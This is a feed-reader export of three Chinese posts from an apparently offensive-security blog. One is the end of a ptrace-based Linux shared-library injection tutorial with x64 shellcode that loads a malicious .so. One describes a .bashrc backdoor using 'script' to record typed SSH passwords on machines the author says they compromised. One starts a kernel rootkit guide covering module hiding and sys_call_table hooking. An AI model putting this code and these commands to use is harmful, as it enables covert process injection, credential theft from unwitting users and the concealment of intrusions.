能是内存重复使用。。。</p><p>当然大部分情况第一种方式是最快速实现的，毕竟现在分配内存似乎都是按照页分配内存。。只要我们的程序不是刚好attarch到别人malloc出来一小块可执行内存（这真的不是别人在执行shellcode吗），大部分情况都是足够我们shellcode使用的。毕竟我们shellcode总共算下来也就五六个mov/lea，四个call而已</p><p>第二个方式就是。难写。多了一块找libc.so的过程。。。但是我们也要用同样的方式找libcld。。所以总体上来说没差别？</p><h1><del>误区</del></h1><p><del>在写这个文章的时候，我发现我陷入了一个误区，典型的windows用多了的后遗症。。我都有ptrace了，我为啥还要再写个shellcode去控制进程</del></p><p><del>我tmd直接用本地程序ptrace寻址到远程mmap,dlopen,dlsym这些地址，然后直接控制ptrace运行这些玩意不就行了。。然后等so运行之后起个线程然后再用ptrace还原。。不就tmd完事了</del></p><p><del>所以依旧是上面那套方案，只不过修改了些过程</del></p><ul><li><del>ATTACH进程</del></li><li><del>接管进程</del></li><li><del>备份原本RIP的数据</del></li><li><strong>寻找远程进程的mmap,dlopen,dlsym地址</strong></li><li><del>进程内存中覆盖我们的shellcode</del></li><li><del>运行shellcode</del></li><li><del>shellcode加载SO文件</del></li><li><del><strong>ptrace调用mmap申请内存</strong></del></li><li><del><strong>ptrace调用dlopen,dlsym加载so</strong></del></li><li><del>So文件多线程运行我们的负载</del></li><li><del>还原原本数据</del></li><li><del>执行原本数据</del></li></ul><h1>第二天！！！！！！误区个锤子</h1><p>上面是我昨晚睡前神志不清写的。。我在想peach。。就算有ptrace还是要写shellcode的，比如设置字符串，call函数等等。。。只不过变成分段了而已。所以无视上面这一小章节即可</p><p>所以还得继续写shellcode。我们可以从 <a href=\"https://bbs.pediy.com/thread-141355.htm\">原创-发个Android平台上的注入代码</a> 这里看到一个完整的android的so的完整注入代码。。只不过人家是android的，我们可以拿过来研究研究（<del>修改</del>抄袭抄袭）</p><p>同时经过一些搜索，可以从<a href=\"https://jmpews.github.io/2016/12/27/pwn/linux%E8%BF%9B%E7%A8%8B%E5%8A%A8%E6%80%81so%E6%B3%A8%E5%85%A5/\">LINUX进程动态SO注入</a> 看到另外一种dlopen的寻址方式。。之前是通过内存寻找偏移的方式寻址，从这个文章里了解到可以通过</p><pre><code>有一种方法是, 通过查看 cat /proc/1234/maps 的加载地址, 加上函数符号在文件中的偏移来得到, 这里并不打算采用这种方法, 而是通过解析 ELF 文件结构得到 __libc_dlopen_mode 函数符号的地址. (这里需要比较多的 ELF 的文件结构的知识, 可以参考前面的\\)\n</code></pre><p>看似挺优雅。。。然而我对ELF文件结构不太熟。。。这里只列出一个实现方法。。下次有机会再研究研究。。</p><p>然后又寻找到了一个方法，在WINDOWS下我们能通过FS寄存器来寻找ntkernel的模块基址然后寻址到loadlibrary这些的，在linux下我们能通过DT_DEBUG来获得各个库的基地址，详情可以看以下这几个文章</p><ul><li><a href=\"http://rk700.github.io/2015/04/09/dt_debug-read/\">linux下获取模块基址,通过DT_DEBUG来获得各个库的基址</a></li><li><a href=\"https://reverseengineering.stackexchange.com/questions/6525/elf-link-map-when-linked-as-relro\">ELF link_map when linked as RELRO</a></li></ul><p>所以，基本构造研究好了，就开始写shellcode了。。有分为两个方式</p><ul><li>使用masm编译后提取字节码</li><li>使用.s编写shellcode然后用gcc连接到程序然后程序获取地址直接提取</li></ul><p>那还用问肯定用第二个方法啊。不过VS下能用编译器魔法直接写C代码作为提取。。。不知道有无方法在GCC下也用编译器魔法直接提取shellcode。。。要是能用用的话那就方便了嗷</p><h1>开整</h1><p>首先，先把ptrace的那些整过来，看雪老哥的那个Android的So注入的代码很好，<strong>我的了！（（（</strong>，直接把代码拿过来进行一个封装</p><p>注意：<strong>以下代码大部分都是基于<a href=\"http://ele7enxxh.com/Android-Shared-Library-Injection.html\">Android动态库注入技术</a>的代码进行修改以及部分调整，并非完全博主原创！！！特此再次声明版权</strong>，不过我会在里面加入一些自己的见解就是了。</p><p>首先，因为原项目用的是arm+32位，所以得把pt_regs换成linux的user_regs_struct和uint32_换成uint64_t</p><pre><code>int ptrace_getregs( pid_t pid, struct user_regs_struct* regs );\nint ptrace_setregs( pid_t pid, struct user_regs_struct* regs );\nint ptrace_readdata( pid_t pid,  uint8_t *src, uint8_t *buf, size_t size );\nint ptrace_writedata( pid_t pid, uint8_t *dest, uint8_t *data, size_t size );\nint ptrace_writestring( pid_t pid, uint8_t *dest, char *str  );\nint ptrace_call( pid_t pid, uint64_t addr, long *params, uint32_t num_params, struct user_regs_struct* regs );\n\nint ptrace_continue( pid_t pid );\nint ptrace_attach( pid_t pid );\nint ptrace_detach( pid_t pid );</code></pre><p>然后再对它的代码进行一些小修改，比如一些PC寄存器改成IP寄存器等，其中最重要的是ptrace_call函数。</p><p>原函数是</p><pre><code>int ptrace_call( pid_t pid, uint32_t addr, long *params, uint32_t num_params, struct pt_regs* regs )\n{\n    uint32_t i;\n\n    for ( i = 0; i &lt; num_params &amp;&amp; i &lt; 4; i ++ )\n    {\n        regs-&gt;uregs[i] = params[i];\n    }\n\n    //\n    // push remained params onto stack\n    //\n    if ( i &lt; num_params )\n    {\n        regs-&gt;ARM_sp -= (num_params - i) * sizeof(long) ;\n        ptrace_writedata( pid, (void *)regs-&gt;ARM_sp, (uint8_t *)&amp;params[i], (num_params - i) * sizeof(long) );\n    }\n\n    regs-&gt;ARM_pc = addr;\n    if ( regs-&gt;ARM_pc &amp; 1 )\n    {\n        /* thumb */\n        regs-&gt;ARM_pc &amp;= (~1u);\n        regs-&gt;ARM_cpsr |= CPSR_T_MASK;\n    }\n    else\n    {\n        /* arm */\n        regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK;\n    }\n\n\n    regs-&gt;ARM_lr = 0;    \n\n    if ( ptrace_setregs( pid, regs ) == -1 \n        || ptrace_continue( pid ) == -1 )\n    {\n        return -1;\n    }\n\n\n    waitpid( pid, NULL, WUNTRACED );\n\n    return 0;\n}</code></pre><p><del>其中最大的不同是函数传参方式，arm使用的是fastcall传参，参数保存在寄存器里，所以才有<code>regs-&gt;uregs[i] = params[i];</code>。</del></p><p>搞不懂你们arm传参，pt_regs里面的r0-r28不好用吗为啥要用regs改。。不管了。。我们先只管linux下，linux的user_regs没有regs，理论上直接改这玩意就能成。。</p><p><strong>醒了，x64也是存寄存器的，只有x86是用栈传参。然后linux和windows在x64下使用寄存器传参的个数也不同</strong></p><p>windows下是使用4个寄存器传参，详情：<a href=\"https://docs.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=msvc-170\">x64 调用约定</a></p><pre><code>默认情况下，x64 调用约定将前 4 个参数传递给寄存器中的函数。 用于这些参数的寄存器取决于参数的位置和类型。 剩余的参数按从右到左的顺序推送到堆栈上。最左边 4 个位置的整数值参数从左到右分别在 RCX、RDX、R8 和 R9 中传递。 如前所述，第 5 个和更高位置的参数在堆栈上传递。 寄存器中的所有整型参数都是向右对齐的，因此被调用方可忽略寄存器的高位，只访问所需的寄存器部分。\n</code></pre><p>然后linux下是使用6个寄存器传参</p><pre><code>函数的参数在寄存器rdi，rsi，rdx，rcx，r8，r9中传递，并且其他值以相反的顺序在堆栈中传递。译注前6个从左到右依次放入rdi，rsi，rdx，rcx，r8，r9，超出6个的参数从右向左放入栈中。可以通过修改被调用函数的参数来修改在堆栈上传递的参数。\n</code></pre><p>于是乎，修改后的代码如下</p><pre><code>int ptrace_call( pid_t pid, uint64_t addr, long *params, uint32_t num_params, struct user_regs_struct* regs )\n{\n    \n    uint32_t i;\n\n    long *regs_param[7]={\n        (long*)&amp;(regs-&gt;rdi),\n        (long*)&amp;(regs-&gt;rsi),\n        (long*)&amp;(regs-&gt;rdx),\n        (long*)&amp;(regs-&gt;rcx),\n        (long*)&amp;(regs-&gt;r8),\n        (long*)&amp;(regs-&gt;r9)\n    };\n\n    // 前6个参数压寄存器\n    for ( i = 0; i &lt; num_params &amp;&amp; i &lt; 6; i ++ )\n    {\n        // params_reg[i] = params[i];\n        memcpy(regs_param[i],&amp;params[i],sizeof(long));\n    }\n\n    \n    // 超过6个压栈\n    if ( i &lt; num_params )\n    {\n        regs-&gt;rsp -= (num_params - i) * sizeof(long) ;\n        ptrace_writedata( pid, (void *)regs-&gt;rsp, (uint8_t *)&amp;params[i], (num_params - i) * sizeof(long) );\n    }\n    regs-&gt;rsp -= sizeof(long) ;\n    ptrace_writedata( pid, (void *)regs-&gt;rsp, (uint8_t *)&amp;regs-&gt;rip, sizeof(long) );\n    regs-&gt;rip = addr;\n    if ( ptrace_setregs( pid, regs ) == -1 \n        || ptrace_continue( pid ) == -1 )\n    {\n        return -1;\n    }\n\n\n    waitpid( pid, NULL, WUNTRACED );\n    \n    return 0;\n}</code></pre><p>然而即使这样这部分也有局限性，这段代码传参只能使用立即数参数，也就是所说的int类型的参数，无法传递字符串这类</p><p>因为根据调用约定，想使用字符串的话还得将字符串内容使用ptrace_writedata写入目标进程的rbp或者rsp然后再把写入的地址当作参数传入。。所以说还是用shellcode更方便一些。</p><p>同时，我们一般使用这个函数都是需要返回值的，但是如果按照上面这个部分，调用完我们的函数后目标程序会直接继续运行，继续运行下去不知道会运行多少函数，直接覆盖了我们的返回值。</p><p>解决办法很简单，我们手动加个中断让它停止不就行了，直接把ret返回时需要而压入的栈的rip改成0x80即可</p><pre><code>char code[] = {0xcd,0x80,0xcc,0};\nptrace_writedata( pid, (void *)regs-&gt;rsp, (uint8_t *)&amp;code, 3 );</code></pre><p>这样我们调用完函数之后，只需要获取rax的值就知道返回值拉。但是记住这样我们调用了中断后如果不手动纠正rip的话程序必定会崩溃的，所以调用之前一定要保存好rip的值</p><p>mmap部分如上图理论上是没问题了。。。测试一下调用成功，也确实获取到了mmap的返回值<br><img src=\"https://9bie.org/usr/uploads/2021/12/750860111.png\" alt=\"无标题2.png\" title=\"无标题2.png\"><br>接下来就是shellcode部分。。。直接照着看雪老哥的代码进行一个shellcode的写。先手写一个调用的sample然后直接gdb查看汇编</p><p><img src=\"https://9bie.org/usr/uploads/2021/11/2698686322.png\" alt=\"无标题.png\" title=\"无标题.png\"></p><p>最后进行一个shellcode的仿写。我们就简单点，直接弄一个不带任何参数的注入函数</p><pre><code>.intel_syntax noprefix\n.global _dlopen_addr_s\n.global _dlopen_param1_s\n.global _dlopen_param2_s\n.global _dlsym_addr_s\n.global _dlsym_param2_s\n.global _dlclose_addr_s\n.global _inject_start_s\n.global _inject_end_s\n.global _origin_rip_s\n.data\n_inject_start_s:\n    # dlopen\n    lea    %rsi,_dlopen_param2_s\n    lea    %rdi,_dlopen_param1_s\n    call   _dlopen_addr_s\n    push %rax\n    # dlsym\n    lea    %rsi,_dlsym_param2_s\n    mov    %rdi,%rax\n    call   _dlsym_addr_s\n    # call\n    mov %rdx,%rax\n    mov %eax,0\n    call %rdx\n    # dlclose\n    pop %rax\n    mov %rdi,%rax\n    call _dlclose_addr_s\n_dlopen_addr_s:\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n_dlopen_param1_s:\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n_dlopen_param2_s:\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n_dlsym_addr_s:\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n_dlsym_param2_s:\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n_dlclose_addr_s:\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n_inject_function_param_s:\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n.byte 0xFF\n_inject_end_s:\n.space 0x400, 0\n.end</code></pre><p>源作者使用的是.word，因为原作者是32位arm下，不太清楚arm，32位的arm刚好是.word的长度等于0xAAAAAAAA,而我们是64位，本来想直接.long，然而64位汇编编译器下.long长度和sizeof(long)是不一样的就很离谱，一气之下就用了.byte，这样最小单位总不会错了</p><p>这些都整好之后，就和源代码没什么区别了。直接copy过来用就完事了。啊，这dlclose我就不调用了，应该没啥太大事吧，因为我懒得去管栈的内容来单参数了，(因为之前dlopen的参数保存再rax，必定会被后面函数给覆盖所以必须的操作栈来保存这个参数，但是如果不调用的话，dlsym因为是第二个调用的可以在rax被覆盖之前直接写入rdi作为参数所以不需要操作栈)</p><p>然后就是填充地址了，对于计算好的远程dlopen,dlsym地址这些当然是可以直接填充的，直接memcpy到指定位置就行，但是对于dlsym的第一个参数就不行了</p><p>dlsym第一个参数是我们恶意so函数的函数名，还是那句话，我们传参的字符串是在我们进程的进程空间里，所以对于远程进程来说，这个地址它访问不到，所以我们得把这串字符串写到远程进程的空间中，并且得到这个字符串的地址。</p><p>依旧是两个方案</p><ul><li>交给shellcode，由shellcode压栈</li><li>ptrace写到rbp，然后shellcode手动弹出读取</li></ul><p>又或者。。。我们直接写到刚刚mmap生成的辣么一大份的内存里，然后地址指向那不就行了？于是乎</p><pre><code>    remote_code_ptr = regs.rax; //获取mmap取得的地址\n    ptrace_writedata(target_pid,remote_code_ptr,evilFunction,strlen(evilSoPath)+1);\n    _dlopen_param1_s = remote_code_ptr;//写入了数据之后，这里就不再是代码段开头了，而是储存字符串参数的地方\n    // 因为ptrace写入只能4个4个写入如果刚好超过余1就得+4，至于+5是补齐字符串后面的那个\\0，上面的+1同理\n    remote_code_ptr += strlen(evilSoPath)+5; \n    ptrace_writedata(target_pid,remote_code_ptr,evilFunction,strlen(evilFunction)+1);\n    _dlsym_param2_s = remote_code_ptr;//写入了数据之后，这里就不再是代码段开头了，而是储存字符串参数的地方\n    remote_code_ptr += strlen(evilFunction)+5; \n    _dlopen_addr_s = dlopen_addr;\n    local_code_ptr = (uint8_t *)&amp;_inject_start_s;\n    code_length = (long)&amp;_inject_end_s - (long)&amp;_inject_start_s;\n    ptrace_writedata(target_pid,remote_code_ptr,local_code_ptr,code_length ); //写入本地shellcode</code></pre><p>这样子，寻址和填充就完成了。此时我们只要运行就行了。。。。。。不</p><p>还有最后一件事，就是让程序保持继续运行，本来想想我们之前保存了rip，直接jmp过去。想了下好像不行，得把所有寄存器归位才行。</p><p>又到了抉择：</p><ul><li>使用shellcode，硬编码到shellcode后自动归位所有寄存器然后jmp到原始地址</li><li>shellcode加入0xcc中断，本地程序等待so函数执行完毕后使用ptrace的setregs直接还原寄存器</li></ul><p>本来是想用第一种方法的，毕竟能自动化就自动化，第二种方法有一个很大的问题就是你不知道程序何时运行到中断，你得等，但是经过了一通查阅，发现<br><img src=\"https://9bie.org/usr/uploads/2021/12/1948741710.jpg\" alt=\"photo_2021-12-05_18-49-55.jpg\" title=\"photo_2021-12-05_18-49-55.jpg\"><br>啊这，不支持自动pop，那整个锤子，想还原得把所有寄存器手写回去。想想人就yue了。。还是看看第二个方法</p><p>经过一番寻找，发现waitpid很适合我们的操作，只需要我们再shellcode调用尾部加一个int 0x80中断，然后主程序进行waitpid就能捕获到这个中断就知道我们的恶意so程序执行完毕啦。</p><h1>最后阶段</h1><p>上面全部写好了之后，程序也跑起来了，总体来说是没有什么问题的，然而我发现，lea的地址偏移到了一个很奇怪的地方。</p><p><img src=\"https://9bie.org/usr/uploads/2021/12/2670853131.jpg\" alt=\"photo_2021-12-06_15-18-10.jpg\" title=\"photo_2021-12-06_15-18-10.jpg\"></p><p>（注意mov相关的，原本期望是写入一个地址，然而实际上却是QWORD PTR DS:40512A），我十分的疑惑。</p><p>重点是我不知道这个40512A是哪里来的，第一个反应是这个QWORD，让地址只复制了一半，直接查看机器码发现并没有，依旧不知道这个地址是哪里来的<br><img src=\"https://9bie.org/usr/uploads/2021/12/3670320557.png\" alt=\"无标题3.png\" title=\"无标题3.png\"><br>（其中0x48和0x8b是mov,eax对应的指令，后面对应的地址）</p><p>然后过了一会儿，我才突然想到，这玩意NMD不是64bit的地址，而是GCC填充的地址偏移</p><p><img src=\"https://9bie.org/usr/uploads/2021/12/3200112093.png\" alt=\"无标题3.png\" title=\"无标题3.png\"></p><p>我之前shellcode单纯把这玩意当变量用了，所以才出现如此大问题。于是乎我们得修改下shellcode或者C代码。</p><p>本来是打算参考原项目手动计算好偏移，然后C计算完偏移后写入进去，但是似乎arm有些不同。在x64下会遇到一个很蛋疼的问题就比如CALL代码，</p><pre><code>CALL _your_plt_\n_your_plt_:\n0xi_want_call_address</code></pre><p>会遇到这种，call偏移中的地址实际上才是你想要jmp的地址的问题，_your_plt_在c代码中是extren的，我们可以直接对其进行操作，然而操作对象实际是0xi_want_call_address这里，目前并没有什么办法通过extren直接让_your_plt变成指向0xi_want_call_address的偏移地址。</p><p>最后依旧是有两个解决方案</p><ul><li>把_your_plt真的变成函数</li><li>暴力修改CALL _your_plt_中_your_plt_的值</li></ul><p>第一种方案就是，既然你只能call到_your_plt这个地址，那么我们修改汇编代码，直接在_your_plt继续call我们真实想要的地址不就行了？理所当然的这么想也理所当然的误入歧途，这很明显是不对的，就本来你原本有能力直接做到你非要拐一下，就很蠢。</p><p>既然代码直接在我们内存中，那我们就直接用二进制的思路来，gcc修改不了extren的值，我们自己改，直接把extren设置到目标指令，获得该地址的偏移，然后地址+2bytes忽略xor的两个机器码，剩下8bytes就是我们要改的地方了</p><pre><code>_dlopen_param1_s:\n    mov %rdi,0xFFFFFFFF\n_printf_addr_s:\n    call 0xFFFFFFFF</code></pre><p>于是乎，我们的完整shellcode就成了这样</p><pre><code>.intel_syntax noprefix\n.global _dlopen_addr_s\n.global _dlopen_param1_s\n.global _dlopen_param2_s\n.global _dlsym_addr_s\n.global _dlsym_param2_s\n.global _dlclose_addr_s\n.global _inject_start_s\n.global _inject_end_s\n.data\n_inject_start_s:\n\nloop:\n    jmp loop\n    mov    %rsi,0x2\n_dlopen_param1_s:\n    mov    %rdi,0x1122334455667788\n_dlopen_addr_s:\n    movabs %rax,0x1122334455667788\n    call   %rax\n    push %rax\n_dlsym_param2_s:\n    mov    %rsi,0x1122334455667788\n    mov    %rdi,%rax\n_dlsym_addr_s:\n    mov %rbx,0x1122334455667788\n    call   %rbx\n    call %rax\n    pop %rax\n    mov %rdi,%rax\n_dlclose_addr_s:\n    mov %rbx,0x1122334455667788\n    call %rbx\n    int 0x80\n    int 0xcc\n\n_inject_end_s:\n.space 0x400, 0\n.end</code></pre><p>而我们的寻址方式，就理所当然的变成了</p><pre><code>    // 填充0x1122334455667788\n    memcpy((void*)((long)&amp;_dlopen_addr_s+2),&amp;dlopen_addr,sizeof(long));\n    memcpy((void*)((long)&amp;_dlsym_addr_s+2),&amp;dlsym_addr,sizeof(long));\n    memcpy((void*)((long)&amp;_dlclose_addr_s+2),&amp;dlclose_addr,sizeof(long));\n</code></pre><p>shellcode最后的<code>mov %rbx,0x1234</code>是为了让程序还原原本的寄存器而设置的flag位，代码如下</p><pre><code>    printf(\"+ Waiting....\\n\");\n    waitpid( target_pid, NULL, WUNTRACED  );\n\n    while(1){ //进行等待用于判断程序是否执行完我们的shellcode\n        if ( ptrace_getregs( target_pid, &amp;regs ) == -1 ){\n            printf(\"- Getregs Error\\n\" );\n            return -1;\n        }\n        sleep(1);\n        printf(\"- Now rbx is :%p\\n\",regs.rbx);\n        if(regs.rbx=1234){\n            break;//判断执行完shellcode了，开始还原寄存器\n        }\n    }\n    printf(\"+ EvilSo Injected.\\n+ Recorver the regsing...\\n\");\n    ptrace_setregs( target_pid, &amp;original_regs );\n    ptrace_continue( target_pid );</code></pre><p>就这样，我们的注入就告一段落了，完美的注入进去<br><img src=\"https://9bie.org/usr/uploads/2021/12/1944594873.png\" alt=\"无标题.png\" title=\"无标题.png\"></p><p>接下来就是处理下一个阶段的问题</p><h1>武器化</h1><p>首先要解决的一个问题就是，并不是所有的程序都有带dlfcn.h和带ldl编译。不带这两个参数注入的话，虽然从maps里还能看到ld.so，但是寻址出来的地址却不知道飞到那里去了，所以得解决这个问题，根据网络上的资料以及自己跟一遍汇编很容易得出dlopen只是一个马甲，真实调用的还是libc下的__libc_dlopen_mode，然而普通情况下我们是没办法直接在C里面使用(long)__libc_dlopen_mode这样找到地址的，必须得用其他方法找。</p><p>本地进程可以直接调用dlopen后，直接通过读取dlopen的内存地址中的跳转找到plt-&gt;got-&gt;__libc_dlopen_mode的真实地址。</p><p>自闭懒得研究了咕咕咕，直接看<a href=\"https://jmpews.github.io/2016/12/27/pwn/linux%E8%BF%9B%E7%A8%8B%E5%8A%A8%E6%80%81so%E6%B3%A8%E5%85%A5/\">LINUX进程动态SO注入</a>就是用这种寻址方式，把dlopen这几个函数的寻址方式替换成它这个就行了，懒得写了。</p><p>-- <del>未</del>已完待续</p>"
    },
    "origin": {
        "streamId": 44,
        "title": "⑨BIE",
        "htmlUrl": "https://9bie.org/",
        "feedUrl": "https://9bie.org/index.php/feed/"
    }
},
{
    "id": "https://9bie.org/index.php/archives/840/",
    "timestampUsec": "1660193526434907",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "低权 Linux 键盘记录方案",
    "author": ";⑨BIE",
    "published": 1639483620,
    "updated": 1639483620,
    "alternate": [
        {
            "href": "https://9bie.org/index.php/archives/840/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h1>前言</h1><p>日了几台机器，虽说部分机器有ROOT，可以直接用之前的 <a href=\"https://9bie.org/index.php/archives/742/\">一般路过PAM后门 / SSH密码记录</a>，来替换PAM，用于记录密码。</p><p>然而问题是，这货上了LDAP，还自己改了改他们的PAM，所以直接替换PAM的方案行不通了。</p><p>而且有一个跳板机，我们没有低权限，但是当前用户却会用这台机器连接其他目标，使用的都是一些我们没找到的凭据。</p><p>那么有没有什么办法能搞到他们呢？</p><p>最开始预想的是用go，自己写一个，直接起个pty直接io.copy用户输入和bash，然后我们监听目标输入就行。</p><p>之后在群里大佬的提拔下。知道了还有script这个好东西。</p><p>直接一句</p><pre><code>exec script -B /tmp -aqf</code></pre><p>没有-B参数把-B参数删了其实也没差</p><p><img src=\"https://9bie.org/usr/uploads/2021/12/2591228174.jpg\" alt=\"photo_2021-12-14_21-37-37.jpg\" title=\"photo_2021-12-14_21-37-37.jpg\"><br>经过测试，SSH输入的密码也能记录。简直就是linux自带后门</p><p>然后就是用户登录自动记录的问题了。一开始直接把这个放到.bashrc/.zshrc下的最后一行，发现并不能work。<br>了解了下才发现，这个语句会加载bashrc的脚本造成这行代码的递归调用。<br>说到底就是加载.bashrc,bashrc运行script，script加载bashrc，bashrc加载script这样循环....</p><p>解决方案也很简单。直接在最后一行换成</p><pre><code>if [ -f /tmp/script.lock ];then\n        rm /tmp/script.lock\nelse\n        echo lock &gt; /tmp/script.lock\n        exec script -B /tmp/test -aqf\nfi</code></pre><p>这样就成啦</p><h1>进阶</h1><p>本来想着这个-B参数能不能用类似/dev/tcp这种文件符号直接发送到远端，这样我们只要开着个接收器别人的密码就来了更安全更隐蔽。<br>或者加一个远端连不上就自动删除.bashrc的这行类似代码。。然而实际上并不行。。。于是乎就靠各位大佬们解决啦。</p>"
    },
    "origin": {
        "streamId": 44,
        "title": "⑨BIE",
        "htmlUrl": "https://9bie.org/",
        "feedUrl": "https://9bie.org/index.php/feed/"
    }
},
{
    "id": "https://9bie.org/index.php/archives/847/",
    "timestampUsec": "1660193526434908",
    "categories": [
        "user/-/state/com.google/unread",
        "user/-/state/com.google/starred"
    ],
    "title": "Linux下进程隐藏 三 - 高版本Linux下简易Rootkit编写",
    "author": ";⑨BIE",
    "published": 1642956300,
    "updated": 1642956300,
    "alternate": [
        {
            "href": "https://9bie.org/index.php/archives/847/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h1>前言</h1><p><strong>本文用途：只是为了记录自己的研究过程，参考的内容都会给出来源。</strong></p><p>经过前面两章的研究，我们已经研究了在用户层下面的相关研究方案，然而用户层下面终究会有一些蛛丝马迹泄露出我们后面相关的蛛丝马迹，所以我们就得编写一个简易的内核层的东西来。</p><p>先确定目标，我们的rootkit必须有三个功能，一个是自身的隐藏，让用户无法检测到我们自己的存在，第二个是对系统关键内容的修改，比如隐藏文件，隐藏进程，隐藏CPU指行状态等，对其他程序进行隐藏，第三个就是想到再说</p><p>首先第一步，我们先从网络上最简单的hello,world开始</p><pre><code>//hello.c\n#include &lt;linux/init.h&gt;  \n#include &lt;linux/module.h&gt;  \n   \nMODULE_LICENSE(\"GPL\");  \nstatic int hello_init(void)  \n{  \n  printk(KERN_ALERT \"Hello, world\\n\");  \n  return 0;  \n}  \nstatic void hello_exit(void)  \n{  \n  printk(KERN_ALERT \"Goodbye, cruel world\\n\");  \n}  \n   \nmodule_init(hello_init);  \nmodule_exit(hello_exit);  </code></pre><pre><code>//Makefile\nobj-m :=hello.o  \nKERNEL :=/lib/modules/$(shell uname -r)/build \nPWD :=$(shell pwd)  \nmodules :  \n    $(MAKE) -C $(KERNEL) M=$(PWD) modules  \n.PHONEY:clean  \nclean :  \n    rm -f *.o *.ko  </code></pre><p>上面就是要给最简单的hello,world最简单的代码。</p><p>然而想要直接编译我们还得先安装一个源码包，否则没法编译</p><pre><code>apt install build-essential\napt install linux-headers-`uname -r`</code></pre><p>根据系统的不同自行替换包管理软件，反正大体都是linux-headers-xxx之类的软件。至于build-essential，不同系统有不同的叫法，比如arch是base-devel。centos是。。什么什么devel来着总之就是类似的东西。</p><p>安装了之后才会在/lib/modules/下有当前系统的源码包，我们以上的代码才能编译。</p><p>编译成功后会在系统下面生成一个ko文件，使用insmod可以进行加载，lsmod可以查看所有安装的模块，然后试rmmod可以对模块进行删除。</p><p><figure><img alt=\"hello_ko.png\" data-src=\"https://9bie.org/usr/uploads/2022/01/2297455875.png\" src=\"https://9bie.org/usr/uploads/2022/01/2297455875.png\"><figcaption>hello_ko.png</figcaption></figure></p><h1>隐藏自身</h1><p>由于这部分已经有作者写过了，说的很详细，我就一笔带过，详细可以参考<a href=\"https://arttnba3.cn/2021/07/07/CODE-0X01-ROOTKIT/\">【CODE.0x01】简易 Linux Rootkit 编写入门指北</a></p><p>这篇文章，基本原理就是与，模块所有信息都储存于一个结构体链表中，只需要把我们的模块从这个链表中删除，那么lsmod工具就无法发现我们的模块，当然也不是没有发现的办法，这个我们后面再说。</p><p>简单的使用方法就是如下</p><pre><code>list_del(&amp;THIS_MODULE-&gt;list);\nkobject_del(&amp;THIS_MODULE-&gt;mkobj.kobj);\nlist_del(&amp;THIS_MODULE-&gt;mkobj.kobj.entry);</code></pre><p>上述的方案就是删除/proc/modules。/sys/modules和kobj中的链表相关内容。这样执行之后我们的模块就无法通过lsmod这类工具查找出来了。</p><p>其中THIS_MODULE是一个C的宏，指向模块自身。<br><figure><img alt=\"this_module.PNG\" data-src=\"https://9bie.org/usr/uploads/2022/01/2842804729.png\" src=\"https://9bie.org/usr/uploads/2022/01/2842804729.png\"><figcaption>this_module.PNG</figcaption></figure></p><h1>隐藏文件？no！ 得先看看如何HOOK</h1><p>使用strace我们可以看到ls的所有栈调用，我们可以从中选择我们希望hook的函数。</p><p>我们在ring3下使用LD_PRELOAD的方式就是hook readdir函数。然而在内核中，我们应该直接HOOK系统调用号。</p><p>现在唯一的问题就是如何HOOK</p><p>对于提升到内核当中的我们来说，首要的问题不是是否有权限，最大的问题是HOOK哪里。又回到了老生常谈的寻址问题。</p><p>在早期内核中，有一个非常简单的寻址方式就是利用<code>kallsyms_lookup_name</code><br>直接通过<code>kallsyms_lookup_name</code>和<code>lookup_address</code>找到<code>sys_call_table</code>的地址然后就可以直接使用该地址</p><pre><code>   syscall_table = (void *)kallsyms_lookup_name(\"sys_call_table\");\n   \n   /* get the page table entry (PTE) for the page containing sys_call_table */\n   pte = lookup_address((long unsigned int)syscall_table, &amp;level);</code></pre><p>通过上面的方法就可以随心所欲的找到我们的目标地址并进行HOOK，然而</p><pre><code>[Unexporting kallsyms_lookup_name()][4]\n</code></pre><p>kallsyms_lookup_name模块最近被废止了。至少在比较新的系统上是无法使用它了。</p><p>然后就是网络上的其他方法，最典型的是暴力搜索法。</p><p>意外的发现一个参考资料 <a href=\"https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/sys_call_table.html#sys-call-table\">Linux Rootkit 系列</a>，里面写的很详细，然而问题是这篇文章的东西有点老，很多东西都无法使用了。这里就大致记录下几个坑吧</p><p>虽然说kallsyms_loopup_name是无法使用，但是如果直接读取/proc/kallsyms，还是能获得到地址的</p><pre><code>sudo cat /proc/kallsys |grep -w sys_call_table</code></pre><p>接下来根据文章，直接暴力搜索内存， 这也是很多文章中通用的方法</p><pre><code>unsigned long **get_sys_call_table(void)\n{\n  unsigned long **entry = (unsigned long **)PAGE_OFFSET;\n    for(; (unsigned long)entry &lt; ULONG_MAX; entry += 1){\n      if(entry[__NR_close] == (unsigned long *)sys_close)\n          return entry;\n    }\n    return NULL;\n}</code></pre><p>使用这段代码，首先遇到的一个问题是，<code>‘sys_close’ undeclared</code>，后来根据了解在2.6之后sys_close被替换成了ksys_close，然而即使替换程了ksys_close也无法使用。</p><p>这是因为在现代内核（&gt;4.15）中，系统将不再到处系统调用了。</p><p>接下来就是文章中另外一个用法：<code>/boot/System.map</code></p><p>然而，从v5.10 之后，System.map将不再提供地址信息了。详细可以参考这里：<a 